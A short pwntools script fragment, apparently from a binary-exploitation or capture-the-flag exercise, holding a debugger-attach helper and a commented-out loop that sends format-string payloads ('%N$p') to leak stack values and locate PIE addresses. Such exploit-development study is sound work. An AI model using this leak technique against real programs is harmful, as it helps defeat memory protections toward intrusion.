from pwn import util

def debug(p):
	pid = util.proc.pidof(p)[0]
	print(pid)
	util.proc.wait_for_debugger(pid)


# find PIE adresses
#p = process(binary.path)        
# for i in range (1,60):    
#     payload = f"%{i}$p".encode()
#     p.sendlineafter(b'exit',payload)            
#     try:
#         p.recvuntil(b"here is your choice\n")
#         recv=p.recvline().strip()
#         # if b'0x7' in recv:
#         warn (f"PAYLOAD: {payload} RECV: {recv}")
#     except:
#         pass

#leak.ljust(8, b"\x00")